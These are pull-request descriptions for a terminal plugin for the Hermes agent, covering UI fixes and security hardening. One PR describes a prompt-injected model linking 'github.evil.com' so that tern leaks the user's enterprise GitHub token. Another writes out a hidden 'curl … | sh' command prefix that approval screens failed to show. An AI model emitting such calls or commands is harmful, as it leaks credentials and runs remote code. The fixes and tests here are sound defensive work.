- The call answers at once and the model runs in a thread (two at a time, at most 8 waiting; a call that waited past the pane's 120-second wait is answered at once instead of spending a model request). The gateway serves one connection's requests in order, and a chart can take a minute. A slow chart would otherwise hold up the pane's prompts.
- The reply is a session event (`ctx.emit_to_session`), matched by a job id.
- A Hermes without plugin RPC methods answers "unknown method". The pane then treats charts as unavailable, as it does when no auxiliary model is configured.

## What tern touches in core

| | Before | After |
| --- | --- | --- |
| Model call | `agent.auxiliary_client.call_llm` (private), in a child process | `ctx.llm.complete_structured` (public) |
| Redaction | `agent.redact.redact_sensitive_text` | the same import. An open core PR adds it to the public import list (`hermes_cli/data/plugin_api.json`); then it is public with no change here |
| Hermes' environment | `HERMES_PYTHON` + `HERMES_PYTHON_SRC_ROOT` + `pm.environments.activate_dependencies` | none: the code runs inside the gateway |
| Frontend ↔ plugin | stdin/stdout of a child process | `ctx.register_rpc` + `ctx.emit_to_session` (public, #142005) |
| "No auxiliary model" | `except AuxiliaryClientUnavailable` (private class) | matched by class name, with no import |

## Small open models: JSON schema, JSON mode, or the old tool call

I ran the real request (the real prompt, three jobs: a load test, pytest, a training loop) through `call_llm` on the Nous portal, with one retry carrying the errors, as the pane does. I checked the model that really answered.

| Model | Old forced tool call | `json_schema=` | `json_mode=True` (this PR) |
| --- | --- | --- | --- |
| Llama 3.1 8B | 0 of 3 | 0 of 3 | 2 of 3 |
| Gemma 3 12B | 0 of 3 (all 3 silently fell back to the main model) | 0 of 3 | 1 of 3 |
| Qwen3 14B | 3 of 3 | 0 of 3 (1 fell back) | 2 of 3 |
| Ministral 8B | 2 of 3 | 1 of 3 | 1 of 3 |
| Ministral 3B | 1 of 3 | not run | 1 of 3 |
| gpt-oss 20B | 0 of 3 | 0 of 3 | 3 of 3 |
| **Total** | **6 of 18** | **1 of 15** | **10 of 18** |

With `json_schema=`, `complete_structured` pastes the schema into the prompt, and the small models answered with the schema itself (`{"type": "object", "properties": …}`), retry included. So this PR uses `json_mode=True` and no schema. The system prompt already documents the spec with examples, and the frontend validates every answer against the spec and the process's real output. An answer that is not one JSON object comes back as `rejected` with its text, and the pane asks once more with the reason. The "no auxiliary model" and error paths are unchanged.

## Live run

On Hermes `main` (fc3f64ed18) in a scratch Hermes home, in a real Tern window, against a real gateway. The auxiliary model was Kimi K2.6 (`kimi-coding`). The gateway log shows `plugin_llm.complete_structured plugin=hermes-tern … task=tern_charts … content_type=json`, and the chart drew.

- I could not get a live chart from `main` in that scratch setup (its child process never reached the model), so the "before" chart is the README's image from `main`.
- Kimi on this account allows one request at a time. The first chart collided with title generation and failed with HTTP 429; the next process charted. That is the provider, not this PR.

## Checks

`bun run typecheck`, `bun run test` (912 tests), `bun run lint`, `check:size`, `check:strict`, `check:suppressions`, and the Python tests (`pytest`, 56 tests) pass. `frontend/dist/` is not in this PR: CI builds it on `main`.

## Still left (not in this PR)

- `agent.redact` becomes public when the open core PR that lists it merges.
- The rest of tern's private use of core is listed in PR B and in #141982.

title: fix: send a GitHub token only to github.com and the enterprise hosts you list
body:
## The problem

`hermes tern` shows the pull requests (PRs) the agent links with its `link_pull_request` tool, and reads each one from the GitHub API with the user's token. The PR's host comes from the model: the tool takes a `url`, or `repository` + `number` + `host`.

On `main`:

- `pull_requests.py` accepted any host with a `github` label (`github.evil.com`, `github.com.evil.com`) and kept `user@…`, ports and trailing dots in odd ways.
- The frontend sent `GITHUB_ENTERPRISE_TOKEN` (or `GH_ENTERPRISE_TOKEN`) to every host that was not exactly `github.com`.

So a prompt-injected model could call `link_pull_request("https://github.evil.com/a/b/pull/1")`, and tern would send the user's enterprise token to that server on its next poll. Teknium raised this as a catalog-listing blocker on NousResearch/hermes-agent#141923. This PR follows his suggested fix: only hosts the user lists get the enterprise token, and every other non-github.com host is refused.

## Screenshots

Taken in a headless Tern (`tern serve` + `tern ctl shot`) with a scratch `HERMES_HOME`, the lab's fake model and a fake enterprise token. The prompt asks the fake model to link `https://github.com/alt-glitch/hermes-tern/pull/22` and `https://github.evil.com/acme/app/pull/1`. `lab/fake_model.py` now passes any host to the tool, so the lab can show the refusal.

1. **Linking.** Before: both PRs are linked. After: `github.evil.com` is refused (the red tool card, whose error names the setting), and only #22 is linked.
2. **A link stored by an older version.** Before: tern requested `github.evil.com` with the enterprise token ("fetch failed" only because the host does not resolve). After: "Not read", with no token and no request.
3. **A github.com PR.** It reads as before.

<!-- before-and-after:start -->
| Before (1. Linking) | After (1. Linking) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/1657a57f-17d4-4203-8d81-2b48064a93eb) | ![After](https://github.com/user-attachments/assets/8ead9969-ca2e-4a14-8e71-0ac2c7b85121) |

| Before (2. Stored link) | After (2. Stored link) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/c5446604-0714-4122-b77a-65b71300fab9) | ![After](https://github.com/user-attachments/assets/34dbab2a-cf18-44cf-87b7-306723b5bdb8) |

| Before (3. github.com PR) | After (3. github.com PR) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/c6fd5785-ec1c-4f4f-a05d-b3a92f2df058) | ![After](https://github.com/user-attachments/assets/201b7a9b-bc14-4f79-9537-e580cc0a387f) |

<!-- before-and-after:end -->

## How T3 Code does it, and how tern compares

T3 Code (`pingdotgg/t3code`) also links and polls PRs for threads. I read `packages/shared/src/changeRequestUrl.ts`, `apps/server/src/pullRequest/PullRequestService.ts`, `apps/server/src/sourceControl/GitHubCli.ts` and `BitbucketApi.ts`.

| | T3 Code | tern on `main` | tern after this PR |
| --- | --- | --- | --- |
| Hosts a link may name | Any host with a `github` label passes the URL parser (it says lookalikes are judged "where it is used"). | Any host with a `github` label, or `*.github.com`. | `github.com`, plus the hosts the user lists in `enterprise_hosts`. Nothing else. |
| What decides the host that gets polled | The link must match a project whose **git remote** is on that host (`requireProject`), else `provider-unsupported`. | The model's link. | The model's link, accepted only if the user listed the host; checked again in the frontend before every request. |
| Credentials | Holds no token: runs `gh` with `gh auth token --hostname <host>`, and refuses a `gh` command whose `--hostname`/`--repo` names another host (`targetsVerifiedHost`). | `GITHUB_TOKEN` to github.com; `GITHUB_ENTERPRISE_TOKEN` to **any** other host. | `GITHUB_TOKEN` only to `api.github.com`; the enterprise token only to a listed host. Tokens still come through Hermes, never from `gh` (#63). |
| Host normalisation | Lower case; `URL.hostname` drops userinfo and the port silently; no trailing-dot, IP or IDN checks. | Lower case only. | Lower case, one trailing dot dropped; refuses userinfo, IP literals, non-ASCII labels (IDN only in `xn--` form, and only if listed), and ports unless the listed entry has that port. |
| API base URL | Derived (`gh` picks it from `--hostname`). | Derived from the host. | Derived from the normalised, allowed host; HTTPS only. |
| Redirects | GitHub: `gh` handles them. Bitbucket: follows them itself, only to the same origin (`trustedUrl`). | `fetch` default (`follow`). Current Node drops `Authorization` across origins, older runtimes did not. | Follows them itself, only to the same origin and scheme, at most 3 hops (T3 Code's Bitbucket rule). |
| Stored links to a bad host | Not reached: the remote check fails first. | Polled with the enterprise token. | Shown as "Not read", with no token and no polling. `unlink_pull_request` can still remove them. |

T3 Code relies on the git remote and `gh`'s own per-host login. tern takes its token through Hermes (#63), so it needs its own allowlist. The allowlist is also stricter than T3 Code in one case: T3 Code trusts any project remote with a `github` label, and tern trusts only a remote on a host the user listed.

## What changes for the user

- **github.com users: nothing.** The PR sheet works as before (screenshot above).
- **GitHub Enterprise Server users must list their host once**, then open a new pane:

  ```sh
  hermes config set plugins.entries.hermes-tern.settings.enterprise_hosts '["github.mycompany.com"]'
  hermes config set GITHUB_ENTERPRISE_TOKEN <token>
  ```

  The setting is declared in `plugin.yaml` (`config_schema`), so it also shows in the Hermes plugin settings UI. Add a port (`github.mycompany.com:8443`) only if the server's web address has one.
- **A link to an unlisted host** fails with a `tool_error` that names the host and the setting, and tells the model not to add the host itself.
- **A link stored before this change** on an unlisted host stays on the list, marked as not read, until it is unlinked.
- **The PR of the session's branch** is looked up only when the checkout's remote is on github.com or a listed host. Before, any remote with a `github` label counted.

## How it works

- `pull_requests.py`: `normalize_host()` and `enterprise_hosts()` (read with the public `ctx.get_config("enterprise_hosts")`, which reads `plugins.entries.hermes-tern.settings.enterprise_hosts`). `parse_target()` reads the URL's whole `netloc` (not `hostname`, which hides userinfo and ports), requires `http`/`https`, rejects `.`/`..` repository segments, and refuses an unlisted host. Unlink passes `trusted_only=False`.
- `__init__.py`: the launcher passes the list to the frontend in `HERMES_TERN_GITHUB_ENTERPRISE_HOSTS`. An empty list unsets any inherited value.
- `frontend/src/github/hosts.ts` (new): the same normalisation, and `trusted(host)` returns the host's kind and derived API URLs, or nothing.
- `client.ts`: `tokens()` and every request check `trusted()` first, so an untrusted host gets no token and no request. The request uses `redirect: 'manual'` and follows only same-origin redirects.
- `store.ts`: untrusted links get the "Not read" message and leave the poll cadence. `branch.ts`: `parseRemote` returns only trusted hosts.

Not in scope: GitHub Enterprise Cloud with data residency (`*.ghe.com`, whose API is `api.<tenant>.ghe.com`). tern did not support it before either. A model with a shell can still read the user's environment; this PR closes the path through the link tool and the frontend's polling.

## Tests

Python: `uv run --no-project --python 3.11 --with pytest python -m pytest -q`, 71 passed. Frontend: `bun run typecheck`, `bun run test` (943 passed), `bun run lint`, `check:size`, `check:strict` and `check:suppressions` all pass.

New tests, and how each did against `main`'s code (I ran the new tests with `main`'s `pull_requests.py`, `__init__.py` and `frontend/src/github/*`):

| Test | On `main` |
| --- | --- |
| Python: link refuses `github.evil.com`, `github.com.evil.com`, `user@github.com`, `github.com:8443`, `gist.github.com`, `github.mycompany.com` (unlisted), `ftp://github.com/…`, `github.com/../b`, and `host=` `github.evil.com` / `github.com:8443` / `github.mycompany.com` | **failed** (accepted) |
| Python: link refuses `evil.com/github.com/…` (with and without scheme), `140.82.112.3`, `[::1]`, `host=user@github.com`, `host=127.0.0.1`, `host=evil.com/github.com` | passed (already refused) |
| Python: the refusal names the setting; `GitHub.COM.` normalises to `github.com`; a listed host (and `host:port`) links, an unlisted one does not; the setting may be one string; a legacy link to `github.evil.com` can be unlinked | **failed** |
| Python: the launcher passes the list to the frontend | **failed** |
| Frontend `tokens`: `GITHUB_TOKEN` only for github.com (also `GitHub.COM.`), the enterprise token only for listed hosts; no token for 13 bad hosts (`github.evil.com`, `api.github.com`, `user@github.com`, `github.com:8443`, an IP, `[::1]`, `xn--gthub-n4a.com`, an unlisted host, a listed host on another port, …) | **failed** (enterprise token returned for all of them) |
| Frontend requests: no `fetch` at all for the same 13 hosts; API URLs derived per host | **failed** |
| Frontend redirects: a redirect to `evil.example` fails with one request and `redirect: 'manual'`; a downgrade to `http://` fails; a same-origin redirect is followed with the token; at most 3 hops | **failed**. Note: on `main` the cross-origin case was not an actual leak in Node 26, because `fetch` drops `Authorization` across origins (checked with two local servers); the test fails because `main` left that to the runtime. |
| Python (after Copilot's review): a link stored as `github.evil.com.` or `GitHub.com.` is found by its normalised host | **failed** |

title: The pane's Tern variables and viewer state ride public APIs, not a command prefix and a marker file
body:
## In one line

The agent's commands get the chat's Tern pane through Hermes' public per-session environment, and the pane tells the plugin which session it shows over plugin RPC. The `export TERN_…=…;` prefix, the frontend's regex that hid it, and the viewer marker files are gone.

Stacked on #91 (base: `feat/own-launcher`). Part of [#141982](https://github.com/NousResearch/hermes-agent/issues/141982).

**This fixes catalog blocker 1 at its root** (NousResearch/hermes-agent#141923): the frontend no longer cuts anything from the front of a command, so the approval sheet shows exactly what runs. `export TERN_PANE="$(curl … | sh)"; ls` used to show as `ls`.

## What changes for you

Nothing you should notice. `tern open`, `tern split` and the rest of Tern's CLI still act beside the chat that runs them, in each of several panes on one gateway, and from a subagent. The one visible change: a command now shows in full, in the transcript and in the approval sheet.

<!-- before-and-after:start -->
| Two panes on one gateway: pane A | Pane B, and a subagent of pane B |
|:---:|:---:|
| ![Pane A: its agent's tern split and tern open land beside pane A](https://github.com/user-attachments/assets/f10f38d0-1646-453c-b589-e6353c3b5106) | ![Pane B: its own split, and the file its subagent opened](https://github.com/user-attachments/assets/3b5a2ba2-653c-4477-a194-ace857c03936) |

| The approval sheet shows the whole command |
|:---:|
| ![Allow this command? export TERN_PANE="$(curl -s https://example.invalid/install \| sh)"; ls](https://github.com/user-attachments/assets/407a3341-dbad-4364-8da4-e988170ac938) |
<!-- before-and-after:end -->

## How it works now

```mermaid
sequenceDiagram
  participant F as frontend (a Tern pane)
  participant P as plugin (viewers.py, tern_env.py)
  participant H as Hermes
  F->>P: plugin.hermes-tern.viewer.set {session_id, stored, pid, tern: {TERN_PANE, …}}
  Note over F,P: on every adopt: new session, resume, reattach after a reconnect
  H->>P: resolver(session_id) at each spawn (ctx.register_session_env)
  P-->>H: the pane's TERN_* values (a subagent: its parent conversation's pane)
  F->>P: plugin.hermes-tern.viewer.clear on a switch and on quit
```

- **Env** (`tern_env.py`). `ctx.register_session_env(["TERN_PANE", "TERN_PANE_SOCKET", "TERN_WINDOW_KEY", "TERN_WINDOW_SOCKET", "TERN_DAEMON_SOCKET"], pane_env)` (NousResearch/hermes-agent#142008). Hermes calls `pane_env(session_id)` when it starts a command's process. It walks the delegating conversation's compression lineage, as before, so a subagent gets its parent's pane. A variable the pane lacks is unset; a session no live pane shows keeps the gateway's own values.
- **Viewer state** (`viewers.py`). Three plugin RPC methods: `viewer.set`, `viewer.clear`, `viewer.shown`. The state lives in the gateway's memory. A gateway restart forgets it, and each pane sets it again when it reattaches. A pane whose process died counts for nothing (its pid is checked on each read), as with the marker files. A pane can only claim its own session and that session's stored id, and only the five Tern variables are kept.
- **Pane restore**. "Another live pane shows this conversation" was checked by the launcher, which cannot see the gateway's memory. The frontend now asks `viewer.shown` before it resumes. If another pane shows it, it starts a new session in the pane's launch folder; a switch the user makes while that call is out wins.
- **Deleted**: the `tool_request` middleware and `provides_middleware`, the `export` prefix, the frontend's `TERN_ENV` regex (`withoutTernEnv`) and its five callers, `markViewer` and the `plugin-data/hermes-tern/viewers/` files.

## What tern touches in core

| | Before | After |
| --- | --- | --- |
| The pane in the agent's commands | rewrote every `terminal` command (`tool_request` middleware, `export TERN_…=…;` prefix) | `ctx.register_session_env` (public) |
| What the user sees of a command | a regex cut the prefix back out, and anything shaped like it | the command as it runs |
| Which pane shows which session | a file per session under `plugin-data/hermes-tern/viewers/`, written by the frontend, read by the plugin | plugin RPC (`ctx.register_rpc`, public), in memory |

## Note for #64

Open PR #64 (`render_hints.py`) reads the marker through `tern_env.viewer()`, which this PR removes. It must move to the RPC state: `viewers.viewer_of(ids)` (or `connections.viewed_by_tern(session_id)` for a yes/no).

## Live run

Hermes `main` (f4cfde1e85, with #142008) in a scratch Hermes home, two real Tern windows, one real gateway, `hermes tern` in each. Model: Llama 3.3 70B on W&B Inference.

| Case | Result |
| --- | --- |
| Pane A's agent: `echo $TERN_PANE`, `tern open --split right note.txt`, `tern split "$TERN_PANE" down …` | `PANE=35884451758082` (pane A); the file and the split opened in pane A's window |
| Pane B's agent, same commands | `PANE=35888746725378` (pane B); its file and split opened in pane B's window |
| A subagent of pane B (`delegate_task`): `echo $TERN_PANE`, `tern open --split down sub.txt` | `SUB_PANE=35888746725378` (pane B); `sub.txt` opened in pane B's window |
| Gateway stopped under both panes | both reconnected; pane A's next command still got `TERN_PANE=35884451758082` (the pane set its state again) |
| Pane A asked to run `export TERN_PANE="$(curl -s https://example.invalid/install \| sh)"; ls` | the approval sheet showed the whole command (screenshot) |

The scratch home kept Hermes' default `approvals.mode: smart`, so the auxiliary model approved that last command itself while the sheet was up. It ran harmlessly: `.invalid` never resolves, so `sh` read nothing. That is core's smart mode, not this PR.

For the run only, I set `requires_hermes` to `>=0.23.0` locally (this `main` checkout reports 0.23.0); the committed value stays `>=0.23.1`.

## Checks

`bun run typecheck`, `bun run test` (921 tests), `bun run lint`, `check:size`, `check:strict`, `check:suppressions`, and the Python tests (74) pass. The golden replays now record the `viewer.set`/`viewer.clear` calls (the pid is scrubbed). New tests cover the resolver (two sessions, a compressed conversation, a subagent, a dead pane, a pane that moved), the RPC handlers, and the approval sheet showing an `export TERN_PANE="$(…)"` command in full. `frontend/dist/` is not in this PR.

title: fix(frontend): the todo panel reads cleanly: solid, in the UI face, with a head and a scroll edge
body:
The todo panel (opened from the `todos` pill above the composer) did not read well with a long list. This PR makes it solid, puts it in the UI face, and gives it a header and a scroll edge. It also fixes nested lists, which showed most items twice.

## What was wrong

1. **The panel was see-through.** Its fill was `var(--l1)`, a 6–7% tint (`rgba(232, 236, 244, 0.06)` in the dark theme). The transcript behind it showed through and ran into the todo text.
2. **Items were in the pane's monospace face**, not the UI face that the rest of the chrome uses. Long items wrapped into heavy blocks.
3. **On a wrapped item, the status mark sat between the lines.** Tern's `.sf-ck-item` centers its mark vertically.
4. **No header and no count.** The pill said `todos 2/15`, but nothing in the panel said how long the list was or that it scrolled. A horizontal scrollbar also showed: Tern's phase header is 8px wider than the list (`margin: 0 -4px`).
5. **Done items were as loud as open ones**: a bright filled green disc, struck through.
6. **A nested list showed each plain item twice.** An item with no parent and no subtasks became a phase whose title *and* only item were the same text. A grandchild subtask was dropped.

## Before and after

Lab run: `lab/fake_model.py` on a scratch `HERMES_HOME`, prompt `todos plan the audit` (16 items: long, done, cancelled and nested), headless `tern serve`.

<!-- before-and-after:start -->
| Before (Dark, transcript behind the panel) | After (Dark, transcript behind the panel) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/c0cf4341-661e-48fd-84a3-daf4c56e6ccc) | ![After](https://github.com/user-attachments/assets/dc77345d-269d-470e-b664-49e3a1467251) |

| Before (Narrow pane) | After (Narrow pane) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/f886be4b-4e31-4a09-aff2-1e09376de680) | ![After](https://github.com/user-attachments/assets/deccac0b-3350-4adc-b3ca-787de203f093) |

| Before (Light theme) | After (Light theme) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/3a2cb5bc-a46d-4492-8538-e00157b0e49b) | ![After](https://github.com/user-attachments/assets/fa7b67ec-9d6b-4965-97f1-90760553490d) |

| Before (Todo card in the transcript) | After (Todo card in the transcript) |
|:---:|:---:|
| ![Before](https://github.com/user-attachments/assets/500ef20c-29c6-464b-ab67-2141e715e090) | ![After](https://github.com/user-attachments/assets/9dc35bc3-1eba-4397-87e4-a43776d3b247) |

<!-- before-and-after:end -->

## What changed

- **Solid panel** (`view/styles.ts`): the composer's own fill, `light-dark(var(--pop-bg), var(--raise))`, laid over `var(--panel)`, with the composer's backdrop blur and a 1px `--l2` ring. `--pop-bg` alone is 98% opaque in the dark theme, so the opaque `--panel` base is needed.
- **Header** (`view/todos.tsx`, `todoPanelNode`): "Todos" and "2 of 15 done", counted by `todoProgress`, as the pill counts (a cancelled item drops out).
- **Scroll edge**: only the list scrolls, under the header (`max-height: min(280px, 40vh)`). It fades out over its bottom padding. While more is below, the last visible row fades into the edge. At the end, the fade covers only empty padding, so the last item shows in full. The horizontal overflow is clipped.
- **UI face and mark on the first line**: items are in `var(--sans)`, 13px/20px. `.sf-ck-item` aligns to the top, and the mark is offset to the middle of the first line.
- **Quieter done items**: a plain green check (no disc) at 70% opacity, and a faint strike (`--l3`).
- **Nested lists** (`todoPhases`): a parent with subtasks is a titled phase over all its descendants. The items between parents sit in untitled runs. Each phase is its own `<checklist>`, because Tern heads *every* phase of a multi-phase checklist (an untitled one with a bare ring and count) but leaves a lone untitled phase without a header. A flat list is still one checklist, as before.
- **Todo card in the transcript** (`view/tools/cards/inline.tsx`): it gets the same grouping, mark alignment and quieter done items. Its count now drops cancelled items, so it no longer says `2/16` beside a `2/15` pill.
- **Lab**: `lab/fake_model.py` has a `todos…` flow that writes this list, then a long answer for the open panel to sit over.

## In the Tern element, not here

These are Tern `checklist` behaviours that this PR works around. It does not patch them:

- A multi-phase `checklist` draws a header row for an untitled phase: an empty title with a ring and a count. Tern's CSS engine has no `:has()`, so a stylesheet cannot hide that row. This PR uses one checklist per phase instead. A Tern fix: skip `.sf-ck-ph` when a phase has no title.
- `.sf-ck-item { align-items: center }` centers the mark on a wrapped item. `.sf-ck-ph { margin: 0 -4px }` overflows any scroll container sideways. Both are overridden here.

## Tests

- `src/__tests__/todos.test.ts` (new): phases for flat, nested, all-done (folded), dangling-parent and cycle lists; one checklist per phase; the panel header's count; phase ids that stay apart whatever the todo ids; the card's count without cancelled items. `__snapshots__/todos/panel.json` is a new golden of the panel tree.
- `styles.test.ts`: the stylesheet hash is updated.
- `bun run check` passes: typecheck, 917 tests, lint and the ratchets. `uv run --with pytest pytest -q` passes (46).

## For the reviewer

- **The stylesheet hash will conflict.** Two other open branches also edit `view/styles.ts` (the connections card and the clarify card). Whichever lands second must rebase and run `bun run test -u src/__tests__/styles.test.ts`.
- **The pill is unchanged.** It stays monospace like the other pills in that row, which use Tern's `omp.hud` styles.
- **No drop shadow.** `theme.test.ts` allows only Tern's theme variables (no literal colours), so the panel has the ring without the composer's shadow.
- **No auto-scroll.** The panel does not scroll to the active item. With a long finished prefix, the item under way can start below the fold.

title: fix(frontend): the clarify sheet and card read at a glance
body:
The `clarify` tool (the agent asks you a question and waits) looked broken in a Tern pane. This PR fixes the question sheet and the card it leaves in the transcript. I checked each case in a real Tern pane (headless `tern serve`) against a scratch gateway on hermes-agent `main`, with the lab's fake model making the calls.

## What was wrong

- The radio and checkbox marks sat under their labels. A checkbox drew on top of the label text, and a wrapped label ran under it. Tern spaces omp's ask rows only inside the dock's ask editor, so in a sheet the rows lost their padding.
- No keyboard hints showed. The number keys worked, but nothing said so.
- A long question was one wall of bold heading text, so the actual question was hard to find.
- The shared gateway asks a call's questions one card at a time. The sheet showed no "2 of 3", and it said Submit on every card.
- After you answered, the question and your answer disappeared into "Worked for 1m 15s". Opened, the card was a ragged mono list (`·red`, `✓  green`).
- While the sheet waited, the card listed the choices again in mono, a "Thinking" row ran under it, and the working line said "Clarify: …".
- A timeout closed the sheet with no trace.

<!-- before-and-after:end -->

## What you see now

| Where | Now |
| --- | --- |
| Sheet options | The mark sits beside its label. A long label wraps beside its number key. Other is a checkbox in a multiple choice. |
| Sheet keys | Each option shows the number that picks it. A line beside Skip / Submit names the keys the sheet takes now: move, pick (or space / number to toggle), choose or submit, skip. While you type: submit, and Esc back to the choices. |
| Long question | The question is the title. The agent's context reads under it as body text and scrolls when long. |
| Several questions (shared gateway) | "Question 2 of 3" above the question, found from the running call's args. The button says Next until the call's last card. |
| Waiting | The card says "Waiting for your answer". No "Thinking" row. The working line says "Waiting for your answer…". |
| After the answer | The card stays in view (out of the "Worked for" fold, as a steer does) and folds to its head: `Ask  Which colour? → green`. Several questions: `3 questions → release/0.22 · Yes, a draft · Mention the screenshots`. Open, it shows each whole question and every choice, the picked ones checked. |
| No answer | The head says why: Skipped, "No answer: the question timed out", or "No answer: no window showed the question". |

## How it works

- `prompts/clarify.tsx`: the sheet. `splitQuestion` (in `tools/ask.ts`, shared with the card) picks the question line out of a long question. The key line is a `row` of `kbd` nodes passed to `actionsRow` as its new `lead`.
- `prompts/ask.tsx`: option rows carry `hint: [n]` (Tern draws it as a key cap). Other uses `omp.ask.other.check` in a multiple choice.
- `gateway/handlers/prompts.ts` → `hermes/sharedPrompts.ts` → `prompts/parse.ts`: on `clarify.request`, the handler finds the running `clarify` call, matches the question against its args, and passes `place: {index, total}` with the request. The parser reads it leniently.
- `view/tools/cards/ask.tsx` + `tools/ask.ts`: the card reads `outcome` (`submitted` / `cancelled` / `timed_out` / `undelivered`) and each response's `status`. The head target is now styled spans, so `Card.target` takes `Spans`.
- `view/workLogModel.ts`, `view/transcript.tsx`: clarify cards stay out of the fold. No Thinking row while one runs. `busyLabel` says it waits.
- `view/styles.ts`: the overlay's option padding, the key cap at the row's end, the context text, the key line, and the card's rows.
- `lab/fake_model.py`: `clarify free|long|many|several` and `FAKE_MODEL_CLARIFY_TIMEOUT`, so one scratch home shows every case.

## Tests

- New `src/__tests__/clarify.test.ts` (16 tests): the split, number keys and key line (and how it changes while typing), checkboxes in a multiple choice, unchecking a drafted Other, the place and Next/Submit, the handler finding the place (by choices when two questions read alike, and not finding one), the waiting card, the folded head for one and several questions, timed out / undelivered / cancelled, a resumed call with no result, and the fold and Thinking row in a turn.
- Snapshots updated: the golden `approval-clarify` replay (number keys, key line), `toolRegistry/cards.json` (the new card), and the styles hash.
- `bun run check` passes: typecheck, 923 tests, lint, size, strict, suppressions.
- Copilot review: both findings (twin questions, unchecking Other) fixed in 89e557b.

## For you to decide

- **Skip on the shared gateway ends the whole call, and Hermes reports it as a timeout.** This is a hermes-agent bug, not this plugin. `clarify.respond` with `answer: ""` (what this plugin, the Ink TUI and Desktop all send for Skip and Ctrl+C) reaches `_clarify_send_then_wait`, which reads `""` as "no response". So the batch stops at the first skipped card and the result says `timed_out` with `[user did not respond within Nm]`. The TUI and Desktop comments say the gateway reads `""` as a skip. The only skip the gateway accepts is its private `"\x00skipped"` sentinel, and I did not want the plugin to depend on that. The card shows what the result says, so a skip reads "No answer: the question timed out" until Hermes is fixed. Do you want a hermes-agent issue or PR for this?
- The card is now always out of the "Worked for" fold. A turn with several clarify calls shows each one. I think that is right (they are your own words), but it is a choice.

## Not in this PR

- The sheet's look on the server-request wire (the Ink-style batch with tabs) is unchanged apart from the shared fixes (alignment, keys, context).
- No countdown for the clarify timeout. `timeout_s` is in the event if we want one later.

title: refactor: hermes tern never starts Hermes' own TUI
body:
`hermes tern` in a terminal that is not Tern now prints one line and exits with code 1. It no longer starts `hermes chat --tui`. The plugin now runs none of Hermes' own TUI code.
Claude Fable 5 2[1m] Medium ## Before When the terminal did not answer the Tern Surface Protocol handshake, the frontend exited with code 75. The launcher then ran `hermes chat --tui` with the same flags, as a second process. That fallback needed three things in the plugin: - `chat_flags()`: a mapping from tern's flags back to `hermes chat` flags. - `fallback()`: the code that started the other program with this install's interpreter. - `panes.plan()` took and returned a `hermes chat` flag list, only so the fallback could reuse it. ## After ```mermaid flowchart LR L["hermes tern
launcher.py"] --> N["node frontend/dist/entry.js"] N -->|"Tern answers"| C["the chat"] N -->|"no answer: exit 75"| M["one line on stderr, exit 1"] ``` - The launcher prints why it stops and what to use: Tern, or `hermes chat`. - `chat_flags()` and `fallback()` are deleted. - `panes.plan(fresh=..., explicit=...)` returns only the conversation to resume. It no longer handles flags. - `--worktree` is still refused. The message now names a way that works with `hermes tern`: make the worktree with `git worktree add`, then run `hermes tern` in it. - The "Node.js was not found" message no longer suggests `hermes chat --tui`, which needs Node too. ## What the user sees | Case | Before | After | | --- | --- | --- | | `hermes tern` in Tern | the chat | the chat (unchanged) | | `hermes tern` in another terminal, or inside tmux | Hermes' own TUI started | one line, exit code 1 | | `hermes tern -w` | refused, pointed at `hermes chat --tui --worktree` | refused, pointed at `git worktree add` | ## Live verification Hermes `main` (3b42157858) with this branch as the plugin, in a throwaway Hermes home with the lab's fake model, in a plain pseudo-terminal (not Tern): ```text $ hermes tern -q hi hermes tern: this terminal did not answer the Tern Surface Protocol, so it is not a Tern pane this program can draw in. Run `hermes tern` in Tern (https://stencil.so/tern), or use `hermes chat`. exit=1 $ hermes tern -w hermes tern: --worktree is not supported (Hermes has no public API to make and keep the worktree). Make one with `git worktree add`, then run `hermes tern` in it. exit=2 ``` `tests/test_connections.py` has two timing tests that fail now and then on a loaded machine, on `main` too. They are not touched here.

title: feat(frontend): the pane checks what the gateway supports before it opens a session
body:
`hermes tern` now checks what the gateway supports before it opens a session. On a Hermes that is too old, the pane shows one line that says to run `hermes update`. The frontend also names itself `hermes-tern` on each new session, and builds against today's Hermes `main`.

![An older gateway: the pane says what is missing and what to run](https://github.com/user-attachments/assets/f790b12e-2813-4b16-b946-1ac79ad00e72)

<details>
<summary>Claude Fable 5 2[1m] Medium</summary>

## Why

The next changes move the session picker, compaction markers and subagent views onto gateway methods that Hermes added last week (`session.transcript`, the `session.list` picker fields). A Hermes without them would fail one feature at a time with "unknown method".

The plugin manifest cannot express this. `requires_hermes` compares only the base version, and every Hermes `main` or canary build since 0.23.0 reports `0.23.0`. The gateway does say what it supports: `runtime.describe` lists capability names.

## What changes

```mermaid
sequenceDiagram
  participant F as frontend
  participant G as gateway
  G-->>F: gateway.ready
  F->>G: runtime.describe
  G-->>F: capabilities
  alt every needed capability is listed
    F->>G: session.create (client: hermes-tern 0.1.0) or session.resume
  else one is missing
    Note over F: one notice, no session
  end
```

- **Capability check** (`frontend/src/hermes/requirements.ts`). On every `gateway.ready` the pane reads `runtime.describe` and needs `plugin-rpc-v1`, `session-client-v1`, `session-list-picker-v1` and `session-transcript-v1`. When one is missing it opens no session and shows the notice. A reconnect asks again, so a pane left open across `hermes update` recovers by itself.
- **Client name** (`frontend/src/hermes/gatewayClient.ts`). The shared gateway client gets `client: { name: 'hermes-tern', version }`. The gateway stores it with the session and returns it in `session.info.client`. The version is the frontend package's, and a test keeps it equal to `plugin.yaml`'s.
- **Hermes pin** (`frontend/hermes-src.lock`). Moved from `fc3f64ed18` to `b3746e35dd`, today's `main`. No contract change needed a code change here.
- **Typecheck boundary** (`frontend/scripts/typecheck.mjs`). The bundle compiles Hermes' `@hermes/shared` source, so `tsc` checked that source under this project's stricter flags. Today's `main` has two `noUncheckedIndexedAccess` findings in `session-http-mutations.ts`, which is correct under Hermes' own flags.
- The script reports diagnostics inside `@hermes/shared` as a count and fails on every other diagnostic.

## What the user sees

| Gateway | Before | After |
| --- | --- | --- |
| Hermes `main` or canary from 2026-11-09 on | the chat | the chat (unchanged) |
| An older `main` that has `hermes gateway attach` | the chat; later, features that fail with "unknown method" | one notice, no session |
| The 0.23.0 release (no `hermes gateway attach`) | "this Hermes has no `hermes gateway attach`; run `hermes update`" | the same |

## Live verification

Both runs: this branch as the plugin, a throwaway Hermes home, the lab's fake model, a headless Tern.

| Hermes | Result |
